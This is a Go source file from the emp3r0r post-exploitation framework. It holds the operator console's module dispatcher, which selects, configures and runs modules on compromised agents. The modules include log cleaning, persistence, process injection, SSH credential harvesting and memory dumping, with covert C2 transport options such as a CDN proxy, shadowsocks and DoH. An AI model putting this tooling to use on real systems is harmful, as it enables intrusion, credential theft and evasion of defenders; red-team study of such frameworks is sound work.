//go:build linux
// +build linux

package cc

import (
	"fmt"
	"strconv"
	"strings"

	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/lithammer/fuzzysearch/fuzzy"
)

// CurrentOption all necessary info of an option
type CurrentOption struct {
	Name string   // like `module`, `target`, `cmd_to_exec`
	Val  string   // the value to use
	Vals []string // possible values
}

var (
	// ModuleDir stores modules
	ModuleDirs []string

	// CurrentMod selected module
	CurrentMod = "<blank>"

	// CurrentTarget selected target
	CurrentTarget *emp3r0r_def.Emp3r0rAgent

	// CurrentModuleOptions currently available options for `set`
	CurrentModuleOptions = make(map[string]*CurrentOption)

	// ShellHelpInfo provide utilities like ps, kill, etc
	// deprecated
	ShellHelpInfo = map[string]string{
		HELP:    "Display this help",
		"#ps":   "List processes: `ps`",
		"#kill": "Kill process: `kill <PID>`",
		"#net":  "Show network info",
		"put":   "Put a file from CC to agent: `put <local file> <remote path>`",
		"get":   "Get a file from agent: `get <remote file>`",
	}

	// ModuleHelpers a map of module helpers
	ModuleHelpers = map[string]func(){
		emp3r0r_def.ModGenAgent:     modGenAgent,
		emp3r0r_def.ModCMD_EXEC:     moduleCmd,
		emp3r0r_def.ModSHELL:        moduleShell,
		emp3r0r_def.ModPROXY:        moduleProxy,
		emp3r0r_def.ModPORT_FWD:     modulePortFwd,
		emp3r0r_def.ModLPE_SUGGEST:  moduleLPE,
		emp3r0r_def.ModCLEAN_LOG:    moduleLogCleaner,
		emp3r0r_def.ModPERSISTENCE:  modulePersistence,
		emp3r0r_def.ModVACCINE:      moduleVaccine,
		emp3r0r_def.ModINJECTOR:     moduleInjector,
		emp3r0r_def.ModBring2CC:     moduleBring2CC,
		emp3r0r_def.ModListener:     modListener,
		emp3r0r_def.ModSSHHarvester: module_ssh_harvester,
		emp3r0r_def.ModDownloader:   moduleDownloader,
		emp3r0r_def.ModFileServer:   moduleFileServer,
		emp3r0r_def.ModMemDump:      moduleMemDump,
	}
)

// SetOption set an option to value, `set` command
func SetOption(args []string) {
	opt := args[0]
	if _, exist := CurrentModuleOptions[opt]; !exist {
		CliPrintError("No such option: %s", strconv.Quote(opt))
		return
	}
	if len(args) < 2 {
		// clear value
		CurrentModuleOptions[opt].Val = ""
		return
	}

	val := args[1:] // in case val contains spaces

	// set
	CurrentModuleOptions[opt].Val = strings.Join(val, " ")
}

// UpdateOptions reads options from modules config, and set default values
func UpdateOptions(modName string) (exist bool) {
	// filter user supplied option
	for mod := range ModuleHelpers {
		if mod == modName {
			exist = true
			break
		}
	}
	if !exist {
		CliPrintError("UpdateOptions: no such module: %s", modName)
		return
	}

	// help us add new Option to Options, if exists, return the *Option
	addIfNotFound := func(key string) *CurrentOption {
		if _, exist := CurrentModuleOptions[key]; !exist {
			CurrentModuleOptions[key] = &CurrentOption{Name: key, Val: "<blank>", Vals: []string{}}
		}
		return CurrentModuleOptions[key]
	}

	switch modName {

	// need to read cached values from `emp3r0r.json`
	// these values are set when on the first run of emp3r0r
	case emp3r0r_def.ModGenAgent:
		// payload type
		payload_type := addIfNotFound("payload_type")
		payload_type.Vals = PayloadTypeList
		payload_type.Val = PayloadTypeLinuxExecutable
		// arch
		arch := addIfNotFound("arch")
		arch.Vals = Arch_List_All
		arch.Val = "amd64"
		// cc host
		existing_names := tun.NamesInCert(ServerCrtFile)
		cc_host := addIfNotFound("cc_host")
		cc_host.Vals = existing_names
		cc_host.Val = read_cached_config("cc_host").(string)
		// cc indicator
		cc_indicator := addIfNotFound("cc_indicator")
		cc_indicator.Val = read_cached_config("cc_indicator").(string)
		// cc indicator value
		cc_indicator_text := addIfNotFound("indicator_text")
		cc_indicator_text.Val = read_cached_config("indicator_text").(string)
		// NCSI switch
		ncsi := addIfNotFound("ncsi")
		ncsi.Vals = []string{"on", "off"}
		ncsi.Val = "off"
		// CDN proxy
		cdn_proxy := addIfNotFound("cdn_proxy")
		cdn_proxy.Val = read_cached_config("cdn_proxy").(string)
		// shadowsocks switch
		shadowsocks := addIfNotFound("shadowsocks")
		shadowsocks.Vals = []string{"on", "off", "bare"}
		shadowsocks.Val = "off"
		// agent proxy for c2 transport
		c2transport_proxy := addIfNotFound("c2transport_proxy")
		c2transport_proxy.Val = RuntimeConfig.C2TransportProxy
		// agent proxy timeout
		autoproxy_timeout := addIfNotFound("autoproxy_timeout")
		timeout := read_cached_config("autoproxy_timeout").(float64)
		autoproxy_timeout.Val = strconv.FormatFloat(timeout, 'f', -1, 64)
		// DoH
		doh := addIfNotFound("doh_server")
		doh.Vals = []string{"https://1.1.1.1/dns-query", "https://dns.google/dns-query"}
		doh.Val = read_cached_config("doh_server").(string)
		// auto proxy, with UDP broadcasting
		auto_proxy := addIfNotFound("auto_proxy")
		auto_proxy.Vals = []string{"on", "off"}
		auto_proxy.Val = "off"

	default:
		// other modules
		modconfig := emp3r0r_def.Modules[modName]
		for optName, option := range modconfig.Options {
			argOpt := addIfNotFound(optName)

			argOpt.Val = option.OptVal
		}
		if strings.ToLower(modconfig.Exec) != "built-in" {
			download_addr := addIfNotFound("download_addr")
			download_addr.Val = ""
		}
	}

	return
}

// ModuleRun run current module
func ModuleRun() {
	modObj := emp3r0r_def.Modules[CurrentMod]
	if modObj == nil {
		CliPrintError("ModuleRun: module %s not found", strconv.Quote(CurrentMod))
		return
	}
	if CurrentTarget != nil {
		target_os := CurrentTarget.GOOS
		mod_os := strings.ToLower(modObj.Platform)
		if mod_os != "generic" && target_os != mod_os {
			CliPrintError("ModuleRun: module %s does not support %s", strconv.Quote(CurrentMod), target_os)
			return
		}
	}

	if CurrentMod == emp3r0r_def.ModCMD_EXEC {
		if !CliYesNo("Run on all targets") {
			CliPrintError("Target not specified")
			return
		}
		go ModuleHelpers[emp3r0r_def.ModCMD_EXEC]()
		return
	}
	if CurrentMod == emp3r0r_def.ModGenAgent {
		go ModuleHelpers[emp3r0r_def.ModGenAgent]()
		return
	}
	if CurrentTarget == nil {
		CliPrintError("Target not specified")
		return
	}
	if Targets[CurrentTarget] == nil {
		CliPrintError("Target (%s) does not exist", CurrentTarget.Tag)
		return
	}

	mod := ModuleHelpers[CurrentMod]
	if mod != nil {
		go mod()
	} else {
		CliPrintError("Module %s not found", strconv.Quote(CurrentMod))
	}
}

// SelectCurrentTarget check if current target is set and alive
func SelectCurrentTarget() (target *emp3r0r_def.Emp3r0rAgent) {
	// find target
	target = CurrentTarget
	if target == nil {
		CliPrintError("SelectCurrentTarget: Target does not exist")
		return nil
	}

	// write to given target's connection
	tControl := Targets[target]
	if tControl == nil {
		CliPrintError("SelectCurrentTarget: agent control interface not found")
		return nil
	}
	if tControl.Conn == nil {
		CliPrintError("SelectCurrentTarget: agent is not connected")
		return nil
	}

	return
}

// search modules, powered by fuzzysearch
func ModuleSearch(cmd string) {
	cmdSplit := strings.Fields(cmd)
	if len(cmdSplit) < 2 {
		CliPrintError("search <module keywords>")
		return
	}
	query := strings.Join(cmdSplit[1:], " ")
	search_targets := new([]string)
	for name, comment := range ModuleNames {
		*search_targets = append(*search_targets, fmt.Sprintf("%s: %s", name, comment))
	}
	result := fuzzy.Find(query, *search_targets)

	// render results
	search_results := make(map[string]string)
	for _, r := range result {
		r_split := strings.Split(r, ": ")
		if len(r_split) == 2 {
			search_results[r_split[0]] = r_split[1]
		}
	}
	CliPrettyPrint("Module", "Comment", &search_results)
}
